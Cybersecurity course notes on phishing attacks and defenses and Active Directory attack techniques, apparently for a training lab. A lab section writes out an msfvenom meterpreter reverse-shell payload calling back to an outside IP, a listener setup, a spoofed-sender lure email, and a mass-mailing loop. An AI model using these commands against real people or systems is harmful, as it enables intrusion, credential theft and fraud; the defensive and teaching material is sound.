# MOD 16
## Phishing Attacks and Defenses
### Phishing Attacks
- _Phishing is a cybercrime in which a target or targets are contacted by email, telephone, or text message by someone posing as a legitimate institution to lure individuals into providing sensitive data such as Personally Identifiable Information (PII), banking and credit card details, and passwords._
- Social engineering is an attack that exploits the human element of an organization’s security.
- Phishing is a subset of social engineering, which coerces users to divulge sensitive information or perform an action that they would not under normal circumstances, such as clicking on a malicious link or opening an attachment.
- Typically, attackers run phishing campaigns via email, however, other mediums such as phone calls or Short Messaging Service (SMS) have gained popularity as phishing platforms.
- **Spear phishing**, a targeted form of a phishing attack, is widely **used for initial access** as per MITRE, primarily due to ease and accessibility.
- Anyone can send fake emails, and several tools such as SET facilitate sending mass emails with little technical knowledge, making these attacks widely accessible.
- Script kiddies and nation-state actors alike have been known to initiate phishing attacks; a testament to their success.

### Types of Phishing Attacks
- Phishing is a broad principle of attack that has many avenues of approach. Some common types of phishing attacks include, but are not limited to:
   - Spear Phishing
      - This is a targeted form of phishing, in which the attacker tailors content specific to an organization, group, or individual.
      - In spear phishing, attackers conduct research on the target in order to make the attack more personalized and increase the likelihood of a successful phishing attack.
      - An example of a spear phishing attack: Dragonfly, a cyber espionage group, sent spear phishing emails to employees working on US power grids that contained malicious attachments in hopes of gaining initial access into those systems.
   - Whaling
      - Whaling is another targeted phishing attack that is aimed towards **high-profile targets**, such as individuals that are part of the C-level suite at an organization.
      - More effort and research goes into crafting of these emails due to the high returns for cybercriminals.
      - As higher level personnel often have more access to sensitive information or more authority, the payout of whaling attacks are potentially higher than other phishing attacks.
      - Whaling may have follow-on phishing attacks after the high-profile account is compromised, such as using the Chief Executive Officer’s (CEO) account to ask for a money transfer.
   - Vishing
      - Vishing refers to phishing scams that take place over the phone.
      - Comparatively, vishing has the most human interaction of all the phishing attacks but follows the same pattern of deception.
      - The malicious actor often creates a sense of urgency to convince a victim to divulge sensitive information and uses spoofed caller Identification (ID) to appear as a trustworthy source.
      - A typical scenario involves the attacker posing as a bank employee to flag up suspicious behavior on an account.
      - Once they have gained the victim’s trust, they ask for personal information such as login details, passwords, and Personal Identification Numbers (PIN).
      - The details are then used to empty bank accounts or commit identity fraud.
   - Smishing
      - Smishing is a type of phishing which uses SMS messages as opposed to emails to target individuals.
      - As smartphones gain more functionality, they also accumulate more vectors of attack. Similar to traditional email phishing, attackers can send malicious links, or use high pressure tactics to have users divulge sensitive information.
   - Clone Phishing
      - Clone phishing is a subset of a phishing attack that takes elements from an already sent legitimate email and replaces them with malicious counterparts.
      - This could include spoofing an email address to appear similar to the original sender, replacing a legitimate link with a malicious one, or claiming to be a resend of the original email. 

### Indicators of Phishing
- Attackers use several Techniques, Tactics, and Procedures (TTP) to conduct phishing campaigns. If a message contains some of these elements, then it may be part of a phishing attack.

#### Deceiving the Victim
- Attackers use several tactics to deceive the victim.
- This includes, but is not limited to, sending enticing messages, creating a sense of urgency, impersonating a trusted sender, and appealing to authority.

#### Sending Enticing Messages
- Lucrative offers and eye-catching or attention-grabbing statements are designed to attract people’s attention immediately.
- For instance, a message may claim that the intended victim won the lottery or that there is a hot single in the area waiting to meet.
- If the message sounds too good to be true, there is a strong chance that it is a phishing scam.
- Alternatively, something as simple as a link to a funny video or an interesting news article can be a phishing email as well.
- Attackers utilize seemingly endless amounts of tactics to entice users to click their malicious emails.

#### Creating a Sense of Urgency 
- Cybercriminals often create a sense of urgency by stating that their hook requires immediate action.
- Victims feel compelled to act quickly and, as a result, make worse decisions than they normally would.
- An example is stating that deals are only for a limited time, or that a personal account may be suspended immediately if the victim does not take action within a few minutes.
- When in doubt, the best course of action is to independently verify with the organization that there is an issue.

#### Impersonating a Trusted Sender 
- While it is possible to spoof email addresses under certain circumstances, it is also possible that legitimate email accounts are compromised and used in phishing campaigns.
- In the case that an email coming from a trusted source displays some phishing indicators, it is generally a good idea to independently verify with the organization/individual.
- Alternatively, attackers use domain names that are close to the domain that they are attempting to impersonate.
- For example, bankofarnerica.com looks similar to the legitimate domain bankofamerica.com, with the rn potentially passing as an m at first glance.

#### Appealing to Authority
- People are more likely to obey someone they perceive has some kind of authority.
- Common phishing attacks may impersonate organizations or figures of authority.
- Attackers may claim to be part of law enforcement, the Internal Revenue Service (IRS), or other government organization to make the victim more likely to cooperate.
- In DoD environments, pulling rank is a common method of trying to get things done by appealing to authority.
- As with trusted senders, independently verifying with the organization of authority is generally a good idea when in doubt.

### Phishing Email Contents
- Unless the purpose of the phishing attack was to simply elicit information from the victim, the attacker needs to deliver something in the content that has the capacity to execute code.
- In most cases, a user getting exploited simply by opening an email is unlikely.
- In the past, some mail clients allowed JavaScript, which brought the possibility of exploitation just from opening the email.
- Now, most modern email clients only allow for Hypertext Markup Language (HTML) or plain-text, which does not allow code execution.
- This would require a vulnerability in the mail client to implement, and is a rare occurrence albeit not impossible.
- More common methods used by attackers are malicious attachment files or getting the user to navigate to a malicious website by clicking a link.

#### Attachments
- Attachments in phishing emails often contain malicious payloads.
- In the past, a popular method was simply attaching an executable and attempting to convince a user to run it.
- As email filters become more and more sophisticated at protecting users from themselves by disallowing certain file types, attackers had to adapt.
- They now implement their code in more innocuous seeming file types.
- An attacker can easily embed JavaScript in a Portable Document Format (PDF) file or macros in Microsoft Office documents that execute once opened.

#### Links
- The sky is the limit once the victim decides to click on a hyperlink taking them to a location of the attacker’s choice.
- Since the attacker controls the website, they can initiate a variety of attacks here.
- Attackers can steal cookies, attempt to exploit the user’s browser, etc. A user can be exploited from just visiting a website.

### Other Indicators of Phishing
#### Misspellings and Grammatical Errors
- There are a few reasons for misspellings and typos in a phishing email.
- The most common sense reason is that the cybercriminals sending them may not be from English-speaking countries, thus do not have a good handle on the language.
- Another reason is that email filters look for specific strings in emails to make filtering decisions.
- If words are misspelled, then the email filter may allow the email to reach the user’s inbox.
- A more insidious reason for the prevalence of typos in phishing emails is that cyber criminals want to isolate the most gullible targets by sending overly ridiculous emails.

#### Unexpected Domain or Sender
- Attackers may use free email services or send emails from unexpected domain names.
- Phishing campaigns are initiated by attackers with a broad range of technical skill.
- Since the only thing needed for a phishing attack is an email address that can send emails, attackers often use free email services such as Gmail or Yahoo email accounts to send phishing emails. 

#### Unusual Email Headers
- Emails that have spoofed sender data may show inconsistencies in the email headers.
- Simple Mail Transport Protocol (SMTP) does not have mechanisms for validating email by default.
- If an attacker has access to their own mail server, they can control some of the data that goes in the email headers. Some fields that may help identify phishing attacks are:
   - Received-By: There may be multiple entries in this field.
      - Emails typically contain entries of all mail server hostnames and Internet Protocol (IP) addresses they have traversed to reach their final destination, similar to a traceroute.
      - The first destination in the chain, or the mail server that the attacker first relayed the mail to, may be a giveaway that the email is not legitimate.
   - Received-SPF: Sender Policy Framework (SPF) is an email security mechanism that allows administrators to specify allowed IP addresses and hostnames authorized to send mail on behalf of a domain.
      - An email with a spoofed sender may fail this check.
   - Authentication-Results: This field contains information related to Domain Key Identified Mail (DKIM), Domain-based Message Authentication Reporting and Conformance (DMARC), and SPF.
      - DKIM, DMARC, and SPF work together to provide email authentication.
      - If this field states that these checks did not pass, the user should rightfully be wary.
      - These protocols are discussed in more detail later in the lesson.
   - Return-Path: This is the field that specifies where messages that failed to send go.
      - This is required to be a real email address, and is often what email security protocols check.
      - Defenders can compare the Return-Path to the From field, which may reveal spoofing.

<img width="625" height="466" alt="c008a512-40fe-4588-891d-ceebcb36b53a" src="https://github.com/user-attachments/assets/c83e4fb1-2bc9-4bea-b4e1-178c9ff30d12" />

### Phishing Follow-On Actions
- Once the attacker successfully deceives the victim, follow-on actions typically include:

#### Gathering Data
- This attack does not deliver a payload in a technical sense.
- Victims divulge sensitive information, such as social security numbers, bank account numbers, and other PII. This can result in identity theft for the victim.

#### Harvesting Credentials
- Credential harvesting can be considered a subset of data gathering.
- Attackers attempt to gather login credentials, which could allow for follow-on attacks.
- A common phishing attack involves notifying users that their credentials were compromised, and to change their password by clicking on a link in the email.
- The link takes the victim to a site that impersonates the site’s login page. When users enter their credentials, the attacker collects them.

#### Executing Code
- An attacker may want more functionality after they successfully compromise a victim’s machine, which they can achieve via running their own specific code or running commands.
- If desired, they can deliver an exploit depending on the software, and/or drop a payload, if no exploit was needed (run reconnaissance surveys, etc.).
- Advanced Persistent Threat (APT) 28, or FANCY BEAR, is a Russian nation-state actor that has utilized phishing messages using spoofed websites to harvest credentials against their targets of interest in the US and Western Europe.

#### Conducting a Phishing Campaign
- Conduct a simple phishing campaign to gain insight into how one might be performed.
- Use the popular Mutt command line email client to send phishing emails with a standard meterpreter executable as the payload.
- Carry out a mass mailing campaign once they are successful with the requisite tasks.
1. Run the following commands to verify the Postfix service is functional: `sudo systemctl status postfix` and `sudo ss -lptn`
2. Create a malicous payload via msfvenom: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=199.63.64.51 LPORT=4444 -f exe-small -o attachment.exe`
   ` The options used in this command are:
   - -p: Specifies the desired payload. Since the target(s) in this domain are Windows 10 workstations, the appropriate payload is the 64-bit windows reverse TCP payload.
      - The reverse_tcp payload has the benefit of being better at circumventing end user host and network firewalls since the connection is initiated by the end user’s host device.
   - LHOST: This is the address that the exploited device calls back to.
   - LPORT: This is the port that the exploited device calls back to.
   - -f: This is the file format of the created payload. exe-small creates small Windows-compatible payloads.
   - -o: This option specifies the output file: attachment.exe.
3. Zip the payload: `zip attachment.zip attachment.exe`
4. Open _msfconsole_ in a new window
5. Run `use multi/handler`
6. Set your payload: `windows/x64/meterpreter/reverse_tcp` and show your options
7. Set up the listening host `set LHOST 0.0.0.0`, verify everything is correct, and then run `run -j` to start the listener as a job
8. From the other window, run the following to create a message for the email body: `echo 'This is your company administrator. Malware has been detected on your computer. Use the attached zip file to remove the virus immediately!' > message.txt`
9. Run the following to send the email with the attachment: `mutt -e 'my_hdr From:admin <admin@cda.com>' -s "DETECTED MALWARE!" phishme@cda.com -a attachment.zip < message.txt`
    - -e: Specifies a configuration option. This command spoofs the administrator’s email address by changing the contents of the From field.
    - -s: Subject line of the message
    - -a: Specifies a file to attach
    - phishme@cda.com: The recipient and the target of the attempted phish.
    - < message.txt: Redirects the contents of message.txt into the command, which sets the contents of the file as the message body.
10. Log into Outlook
11. Open up the email, download the malware and run it
12. Switch back to msfconsole window, a new _meterpreter_ session opened, run `session -i 1` to make an interactable session
13. Run `getuid` to see what it is running
14. Exit the session, and open a vim session for emails.txt: `vim emails.txt`
15. Run the following command to send emails to all users: `for email in $(cat emails.txt); do mutt -e 'my_hdr From:admin <admin@cda.com>' -s "DETECTED MALWARE!" $email -a attachment.zip < message.txt; done`
16. Run `sudo grep "status=sent" /var/log/mail.log` to verify the emails were successfully sent

### Phishing Attack Detection
- On a network, some indicators of phishing include:
   - Several emails coming from a single user: There may be a few reasons an attacker uses a single user to send several emails.
      - A compromised email account may be trustworthy in a specific domain.
      - Alternatively, creating an email account and sending mass emails is a trivial matter for attackers.
   - Several emails coming from a suspicious domain: Suspicious domains refer to either an unexpected domain (e.g., a free email service domain like Yahoo or Gmail).
      - External domains are inherently more suspicious than internal domains.
      - It can also refer to a domain that the attacker is attempting to impersonate.
   - Unusual email headers: Unusual email headers may give away a spoofed email address, though this practice is uncommon with modern day email authentication protocols.
- If there are phishing indicators on a network, then hunt for additional indicators of compromise within the mission partner’s networks.
- NIDS and Security Information and Event Management (SIEM) systems are helpful in detecting phishing attacks over a network.
- Observe some signs of a phishing attack occurring over the mission partner’s network using Kibana and Zeek logs.

### Detecting Phishing Emails
1. Enter Security Onion, and update your date range
   - Focus on Mail protocols, but below are lists of different ports/protocols:
     <img width="965" height="238" alt="9a1d98a0-a941-46d3-abd2-77434a84ccf7" src="https://github.com/user-attachments/assets/929deb68-bd59-4744-84e4-43496d39470f" />
     <img width="965" height="292" alt="15947c48-8813-4c09-bcdb-60e4e7ab6653" src="https://github.com/user-attachments/assets/6cf03c85-4b29-4822-8160-24f496e22618" />
     <img width="965" height="238" alt="8e34eee2-5674-45da-80b9-428e4a3247b6" src="https://github.com/user-attachments/assets/5c697950-c3c4-41a9-bf1e-d6655534a833" />
2. Filter down on SMTP
3. Open up the _Discover_ area in Kibana
4. Select the following fields to toggle:
   - _id: An Elasticsearch metadata field that assigns a unique index to an Elasticsearch document.
   - smtp.first_received: First host and IP address that received the message.
   - smtp.from: Displayed sender; this field can be spoofed.
   - smtp.mail_date: Contents of the date field.
   - smtp.mail_from: Real sender address; may differ from smtp.from.
   - smtp.path: Contains the mail servers traversed before the email reached its final destination. The first IP address is the final destination. This field is difficult to spoof as each mail server that the message traverses adds its information to this field.
   - smtp.recipient_to: Real recipient email that the message is sent to; may differ from smtp.to.
   - smtp.subject: Subject line of the email.
   - smtp.to: Displayed recipient.
5. Select the link in the _ _id _ field, and select the list and hex buttons to turn them off
6. Scroll to the bottom to see what was sent in the email.

### Defend against Phishing Emails
#### End User Training
- At an administrative level, user training and awareness is an effective measure in preventing phishing attacks.
- In 2018, the Data Breach Investigation Report from Verizon found that organizations reduced their phishing click rates from 25% to 3% over six years with periodic training (Carnegie Mellon Security blog).
- MITRE also calls out user training as an effective method of reducing the success rate of several social engineering attacks including phishing attempts.

#### Technical Controls
- Technical controls and user training both work together to reduce incidents related to phishing attacks.
- It only takes one click to get a foothold in a network, as seen during the phishing attack.
- Both are essential elements of a successful defensive security policy.
- Technical controls can be implemented in various parts of the network.

### Mitigations on the Network
#### Edge Transport Server
- This is a specific type of relay host in Microsoft Exchange architecture that external organizations send mail to.
- The Edge Transport Server has several mechanisms to screen emails before they are forwarded to the Exchange mailbox server.

#### Dedicated Spam-filtering Appliance
- Other vendors have appliances with comparable functionality to Edge Transport Servers, as far as screening mechanisms go.
- A popular dedicated spam appliance is Barracuda’s Spam Firewall. 

#### Web Application Firewall/Proxy
- Web application firewalls help protect against cases where a user attempts to navigate to a malicious link — including links that are included in phishing emails.
- Web application firewalls detect navigation to malicious domains, malicious network traffic, or Command and Control (C2) communications from infected hosts on the network.

### Mitigations on the Mail or Transport Server
- The mail server, or devices hosting mail-related services, are key places to implement phishing defenses.
- DoD networks typically utilize Microsoft Exchange services, so the following defenses have a heavy focus on Microsoft Exchange.
- Some of these defenses include:
   - **Anti-malware**: Microsoft Exchange has anti-malware features since Exchange 2013.
      - Outlook gets anti-malware definitions from the internet, and allows the mail administrator to specify the actions taken once mail matches a malware definition in a rule-based format.
      - The mail administrator specifies which recipients on the mail server the anti-malware scanning policy applies to.
   - **Spam Filter**: The spam filter in Exchange email architecture is enabled by default on Edge Transport Servers, but can be enabled on the mailbox server as well.
      - It is made of several components, some are discussed in this section.
   - **Content Filtering**: By default, content filtering is enabled and done on Edge Transport Servers but can be enabled on the mailbox server.
      - The Exchange confidence filter works by assigning a Spam Confidence Level (SCL) of 0-9 to a message based on words and phrases in the message, and the mail administrator can make a decision on what happens to the mail depending on the SCL.
   - **Attachment Filtering**: This feature is only available on Edge servers in Microsoft’s Exchange architecture. Attachment filtering works by examining the name, file extension, or MIME Content-Type and performing an action. The actions are either allow the message, allow the message but strip the attachment, or delete the message.
   - **Sender Filtering**: This feature is configurable on the mailbox server or Edge server.
      - Sender filtering is configured to block single users, whole domains, or subdomains.
   - **Sender ID**: This feature is configurable on the mailbox server or Edge server.
      - Sender ID protects against email spoofing by checking DNS for SPF records for authorized senders.
   - **Connection Filtering**: This feature is configurable on the mailbox server or Edge server.
      - Connection filtering allows blocking messages from the specific IP address of mail servers that the mail administrator does not want to receive mail from. SMTP connections are dropped if an IP address appears on the blacklist.
   - **Recipient Filtering**: This feature is configurable on the mailbox server or Edge server.
      - This feature allows mail administrators to specify restricted groups and groups that should not be able to receive mail from the internet.
      - It also allows mail administrators to specify what actions to take for non-existent users.

### Mitigations on the Endpoints
- As mentioned previously, two common methods of executing code are by getting users to open attachments, and getting users to click on links.
- Mitigations can be implemented to reduce the damage of either of those things happening.
   - **HBSS**: If a user saves an attachment (some mail clients provide the option of opening the attachment without saving it first) from a malicious email on disk, an **HBSS** may flag the malware and quarantine or remove it if it contains some qualities that the HBSS deems unsafe.
   - Some HBSS software has the capability to examine an attack in memory, which could prevent an attack if the user opens the attachment instead of saving it first.
   - Some HBSSs may also defend against web attacks. Enabling the HBSS and keeping signatures updated are good practices in defending against phishing attacks.
   - **Disabling Scripts and Macros**: If a user downloads an attachment with macros, or visits a site from a link with malicious script, it may lead to a compromise.
   - A good practice is to disable macros in documents by default.
   - In addition, most browsers have settings that disable JavaScript or other web-based content from running without explicit permission.
   - One caveat is that JavaScript is ubiquitous, and disabling it breaks functionality on several web servers.

### Other Miscellaneous Mitigations
- As briefly mentioned before, DKIM, SPF, and DMARC work together as email authentication protocols.
- Their individual purposes are as follows:
   - **DKIM**: DKIM uses PKI to sign emails leaving the sending server.
      - The receiving mail server verifies that the message is authentic and has not been altered in transit by using the public key published in the sending organization’s DNS records.
   - **SPF**: SPF publishes authorized mail servers and hostnames in a DNS record for the domain.
      - The receiving mail server checks the SPF record to ensure that the sending mail server is authorized to send mail on a domain’s behalf, usually based on the Return-Path field in the email header.
   - **DMARC**: DMARC utilizes the previous protocols and adds a reporting feature on top. It allows domain owners to see who is sending emails on their behalf.
- Implementing these protocols has a two-fold benefit of preventing attackers from spoofing a domain owner’s domain, thus preventing emails from appearing as if they originated inside the organization, and using the domain owner’s domain in phishing attacks against other organizations.
- If attackers are unable to spoof an organization’s domain, then users are more certain of an email message’s origin and make better informed decisions based on the domain.

### Implementing Technical Phishing Defenses
1. Open _Exchange Management Shell_
2. Check status of anti-malware service by running `Get-TransportAgent "Malware Agent"`
3. Open the _Exchange Administrative Center_
4. Select _Protection_ and then the + to define a new anti-malware policy
5. Flll out the information for _Name, Description, and Malware Detection Response_
6. Scroll down to _Applied to_ section, and select _The recipient domain is_
7. Select the Domains that you want, click _add ->_ and then click save.
8. Run `Get-SenderFilterConfig` to get a config of the sender filter
9. Enable this via `Set-SenderFilterConfig -Enabled $true`
10. Block known malicous emails via `Set-SenderFilterConfig -BlockedSenders attacker@internet.com`
11. Block bad domain via `Set-SenderFilterConfig -BlockedDomainAndSubdomains baddomain.com`
12. Verify the Config
13. Move over to the user host to configure security policies
14. Open Word, then select _Word Options > Trust Center_
15. Select _Trust Center Settings_, then _Macro Settings_; change the setting to _Disable all macros without notification_
16. Open _Windows Defender Settings_ and ensure that the following are selected _Real-Time Protection: **On**; Cloud-Based Protection: **OFF**; Automatic Sample Submission: **OFF**; Enhanced Notifications: **ON**_

## Active Directory Attacks and Defenses
### AD Tactics and Techniques
#### Kerberoasting
- Kerberoasting is a post-exploitation technique that allows any compromised user to gather Service Tickets (ST), which are encrypted with the service account’s password.
- Recall that STs are obtained to gain access to resources after an account authenticates to Kerberos and obtains a Ticket Granting Ticket (TGT).
- Any user can request a ticket for any service by default as long as they have a valid TGT.
- Services are identified by Service Principle Names (SPN), which is a unique Identifier (ID) of a service instance.
- If an account has an associated SPN, then they can obtain the password hash for the service account, though the attacker still has to be able to brute force the password.
- User accounts associated with services are the most vulnerable, as administrators often sets the passwords for these accounts once and then forgets about them.
- User accounts associated with SPNs are also protected by weaker encryption than SPNs associated with computer accounts (e.g., the LocalSystem account).
- Service accounts are more valuable than typical user accounts since they often have significant privileges, which may allow the attacker to quickly move laterally within an AD domain and potentially escalate their privileges.
- Kerberoasting is a MITRE ATT&CK sub-technique with the identifier **T1558.003**.

#### Unconstrained/Constrained Delegation
- Delegation, in a nutshell, allows a user or computer to impersonate another account.
- Unconstrained delegation means that the user or computer can impersonate any service, whereas constrained delegation specifies what services the user or computer is allowed to impersonate by reusing end-user credentials.
- Due to security implications, delegation is disabled by default, but has legitimate use.
- For example, consider a mail server with webmail services enabled. When a user logs onto the webmail service to access their emails, they must be authenticated before gaining access to the resources they requested.
- The webmail service authenticates the user, stores their TGT, then forwards their TGT to the DC on the user’s behalf any time they need to access resources within the domain from the webmail server.
- Delegation can be attacked by compromising the machine or account that has delegation privileges, and then extracting all the TGTs in memory.
- This technique would fall under MITRE ATT&CK technique ID 1558: Steal or Forge Kerberos Tickets.

#### DCSync
- DC replication is a valid and necessary function of AD that allows DCs to synchronize data between them.
- Adversaries abuse this functionality by simulating the behavior of a DC and asking other DCs for an entire copy of their AD database, which includes user credentials.
- For this attack to be successful, the adversary needs an account with administrator, domain administrator, or enterprise administrator privileges.
- Alternatively, the adversary needs the permissions of Replicating Directory Changes, Replicating Directory Changes All, or Replicating Directory Changes in Filtered Set.
- This attack is known under the MITRE ATT&CK technique ID **1003.006** as a credentialed access tactic.

#### Pass-the-Ticket
- As per MITRE:
   - Adversaries may Pass the Ticket (PtT) using stolen Kerberos tickets to move laterally within an environment, bypassing normal system access controls.
      - PtT is a method of authenticating to a system using Kerberos tickets without having access to an account's password [or password hash].
      - Kerberos authentication can be used as the first step to lateral movement to a remote system.
- When adversaries gain access to a host, they may attempt to dump OS credentials, which may present them with a valid Kerberos TGT.
- The stolen TGT then allows adversaries to request service tickets for any service within the domain, effectively masquerading as that user on the domain.
- PtT attacks are extremely effective following the compromise of a host with delegation enabled.
- PtT is a defense evasion or lateral movement tactic with the MITRE ATT&CK sub-technique ID T550.003.

#### Pass-the-Hash
- A Pass-the-Hash (PtH) attack relies on weaknesses within New Technology Local Area Network (LAN) Manager (NTLM).
- NTLM is a suite of security protocols that relies on challenge-response mechanisms to provide a Single Sign-On (SSO) solution.
- The challenge response sequence for NTLM involves the following:
   1. The client requesting access to a resource on a server sends a negotiation message.
   2. The server sends back a challenge message, which is a 16-byte random number.
   3. The client returns the challenge to the server, encrypted by the hash of the user’s password.
   4. The server sends the encrypted challenge back to the DC to verify that the password hash used was correct.
- Since the hash rather than the password is used during the encryption process, the hash is sufficient to access resources on behalf of the user when using NTLM security protocols.
- While Kerberos is the default authentication protocol starting with Windows 2000 and later releases, NTLM security protocols are still used for legacy support, as well as a backup in the case that Kerberos fails to authenticate a user.
- PtH is a MITRE ATT&CK sub-technique with the ID T1550.002 and can be used for lateral movement and defense evasion.

#### Golden/Silver Ticket Attack
- If an adversary has the NTLM password hash of service accounts, then they can issue tickets for those services.
- For a typical service, the adversary can forge service tickets, which is known as a Silver Ticket attack.
- In the worst case scenario, if the Kerberos Ticket Granting Ticket (KRBTGT) service account NTLM password hash is compromised, then the adversary can forge TGTs for any account in the AD, known as a Golden Ticket attack.
- Golden and silver ticket attacks fall under the MITRE ATT&CK tactic credentialed access, and are referred to by the sub-technique IDs **1558.001** and **T558.002** respectively.

#### User Access Control Bypass
- In a nutshell, User Access Control (UAC) is a security feature implemented starting with Windows Vista that prompts the administrator for consent for applications requiring administrative access.
- Administrative accounts also have a user-level access token and a superuser access token, so even administrators running programs from a privileged account need to indicate their approval in a prompt.
- The primary intent of UAC is to ensure that most applications run with user-level privileges unless the administrator specifies otherwise, which would prevent accidental system changes or malware compromising a system.
- UAC bypass circumvents the prompt so that it does not appear, which may seem trivial, but adversaries often only have remote access and cannot approve the prompt.
- This corresponds to MITRE ATT&CK ID T1548.002 and can be used for privilege escalation and defense evasion.
- Despite being a MITRE ATT&CK sub-technique, many methods have been discovered to mitigate this security feature.
- UACMe is a Github repository that keeps track of some of them.

### AD Tactics and Techniques | Execution and Persistence
#### Execution
- Upon hearing AD, the first thing that should come to mind is Windows OSs.
- While not a feature of AD, the following utilities can be leveraged by an adversary to execute commands within AD environments as they primarily contain Windows OSs:
   - **Windows PowerShell**: A powerful object-oriented, scripting language that is tightly integrated with the Windows OS.
      - It is identified by MITRE ATT&CK sub-technique ID **T1059.001**.
   - **CMD**: Command-Line Interface (CLI) that is not as robust as Windows PowerShell, but is still widely used within Windows environments.
      - Threats actors often gain primary access through a CMD shell, then access PowerShell or other utilities.
      - It is identified by MITRE ATT&CK sub-technique ID **T1059.003**.
   - **Visual Basic**: Adversaries may abuse Visual Basic (VB) and its derivatives — including VBScript and Visual Basic for Applications (VBA)— for execution.
      - VB is a programming language created by Microsoft with interoperability with many Windows technologies.
      - Common abuses include embedding macros in Office documents, which are then executed with the VB Runtime Library.
      - It is identified by MITRE ATT&CK sub-technique ID **T1059.005**.
   - **Windows Management Instrumentation**: Windows Management Instrumentation (WMI) is a Windows administration feature that provides a consistent environment for local and remote access to Windows system components.
      - Locally, it uses the WMI service for local execution, and Server Message Block (SMB) and Remote Procedure Call Service (RPCS) for remote execution.
      - It is identified by MITRE ATT&CK technique ID **T1047**.
   - **Component Object Model**: Component Object Model (COM) is an Interprocess Communication (IPC) component of the native Windows Application Programming Interface (API) that enables interaction between software objects or executable code that implements interfaces.
      - Client objects can call methods of server objects, which are typically Dynamic-Link Libraries (DLLs) or executables.
      - When used as an execution tactic, it is identified by MITRE ATT&CK sub-technique ID **T1559.001**.
      - Existing COM objects can also be used to obtain persistence in an attack known as COM hijacking, which falls under MITRE ATT&CK sub-technique **T1546.015**.
   - **Dynamic Data Exchange**: Another IPC component, Dynamic Data Exchange (DDE) is a client-server protocol for single use and/or continuous communications between applications.
      - Once a link between applications is established, they can exchange strings, notifications, and requests for command execution.
      - While DDE has been superseded by COM, it can still be enabled in Windows 10 and be used in Microsoft Office 2016 via registry keys.
      - As with VB macros, DDE commands can be inserted into Office documents.
      - It is identified by MITRE ATT&CK sub-technique ID **T1559.002**.


#### Persistence
- While not specific to AD, persistence in AD makes it very easy to set logon scripts for users, groups, and computers granted the adversary has sufficient privileges.
- Adversaries can leverage Group Policy Objects (GPO) to configure settings including, but not limited to, the following that would enable persistence within a domain:
   - Logon or startup scripts
   - Registry keys on machines within a domain
   - Malicious services
   - User accounts

### AD Tactics and Techniques | Discovery and Lateral Movement
#### Discovery
- AD is a database of sorts. Since it stores all objects known to it within the database, attackers who have compromised an AD domain and have the appropriate permissions can use the data within AD to gain more information about the objects in the domain.
- For example, attackers can get lists of all users, groups, and computers within a domain, which can reveal critical information and where to find it.
- Some native tools available to perform discovery tasks in AD are:
   - **Directory Service Query**: Directory Service Query (DSQuery) is a CMD utility that queries the objects in AD by employing user-specified search criteria.
   - **AD PowerShell Module**: A suite of PowerShell cmdlets that allow a user to query AD objects with Windows PowerShell.
      - Some cmdlets in this suite used to gather information about a directory are **Get-AdUser**, **Get-ADDomain**, **Get-AdComputer**, **Get-AdGroup**, **Get-AdGroupMember**, and **Get-AdObject**.
   - **Net Commands**: The net commands can be accessed through CMD and are primarily used to manage network resources.
      - However, net commands can be used by adversaries to **enumerate users, shares, computers, groups, localgroups**, etc.
   - **WMI**: Previously cited as an execution mechanism, adversaries also use WMI to enumerate hosts.
      - WMI Command-line (WMIC) provides a utility usable through CMD to do this.
      - WMIC can be used to **get processes, user accounts, groups**, etc.

#### Lateral Movement
- These services can be used to move laterally within AD environments. However, they are not limited to just AD environments and can be found on standalone workstations.
   - **Remote Desktop Protocol**: Remote Desktop Protocol (RDP) allows users to access a Windows desktop remotely.
      - This is disabled by default on workstations, but due to its utility, it is frequently enabled on servers and workstations.
      - Adversaries can impersonate a legitimate user given the correct credentials.
      - It is identified by MITRE ATT&CK sub-technique ID **T1021.001**.
   - **SMB**: SMB is a network file-sharing protocol that allows applications to read and write files and request services from server programs in a computer network.
      - Historically, many vulnerabilities have been found in SMB that proved devastating to computer networks globally.
      - Conficker in 2008 and WannaCry in 2017 are worms that propagated using exploits against SMB that both resulted in millions of dollars in damages for the systems they infected.
      - It is identified by MITRE ATT&CK sub-technique ID **T1021.002**.
   - **Windows Remote Management**: Windows Remote Management (WinRM) is Microsoft’s implementation of the Web Services-Management protocol, which allows hardware and OSs from different vendors to interoperate.
      - WinRM can be used to obtain management data locally and remotely through WMI.
      - While WinRM is part of the OS, a listener must be enabled to perform remote operations.
      - It is identified by MITRE ATT&CK sub-technique ID **T1021.006**.
   - **Distributed COM**: Distributed COM (DCOM) extends COM functionality so that actions performed through COM can be done remotely by using Remote Procedure Call (RPC).
      - By default, only administrators can activate and launch COM objects remotely.
      - This lateral movement sub-technique corresponds to the MITRE ATT&CK ID **T1021.003**.

### AD Tools
#### BloodHound 
- Bloodhound is a visualization tool that assists with finding paths to exploiting AD principles and other objects.
- It maps things out as nodes, which represent AD objects such as users, groups, or computers.
- Nodes are connected by links known as Edges. Edges are how nodes relate to one another.
- Some examples of edges are:
  <img width="962" height="786" alt="447fc6a9-08c4-4eb3-8a73-590129bbd4f4" src="https://github.com/user-attachments/assets/ea791a55-eb4f-45c6-af11-b820639ee076" />

- **Bloodhound Components**
   - **SharpHound** is the official data collector for BloodHound.
      - It is written in C# and uses native Windows API functions and Lightweight Directory Access Protocol (**LDAP**) namespace functions to collect data from DCs and domain-joined Windows systems.
      - SharpHound is an executable file uploaded after compromising a host to collect AD data.
   - **AzureHound**, as per the Bloodhound documentation, uses the Az Azure PowerShell module and Azure AD PowerShell module for gathering data within Azure and Azure AD.
      - NOTE: Microsoft Azure, commonly referred to as Azure, is a cloud-computing service created by Microsoft for building, testing, deploying, and managing applications and services through Microsoft-managed datacenters.
   - **Bloodhound.py**, while not officially supported by the Bloodhound team, is a Python script that collects data from Linux, OSX, or Windows systems with Python installed.
      - **Domain credentials are required to run the script**.
   - **BloodHound Graphical User Interface (GUI)**
      - This is where most analysis occurs. After obtaining a database of the target’s AD structure, the database is opened in the Bloodhound GUI where the user can begin analyzing paths.

#### Mimikatz
- **Mimikatz** is an open-source tool written in C by Benjamin Delphy, which interfaces with Windows security-related processes to conduct attacks such as **PtH**, **PtT**, **Golden Ticket attacks**, etc.
- It is a popular tool used in many AD attacks. MITRE ATT&CK identifies Mimikatz under the **tool ID S0002**.

#### PowerSploit
- **PowerSploit** is an open-source, offensive security framework comprised of PowerShell modules and scripts that perform a wide range of tasks related to penetration testing such as code **execution**, **persistence**, **bypassing anti-virus**, **reconnaissance**, and **exfiltration**. MITRE ATT&CK refers to PowerSploit as **tool ID S0194**.

#### PowerShell Empire
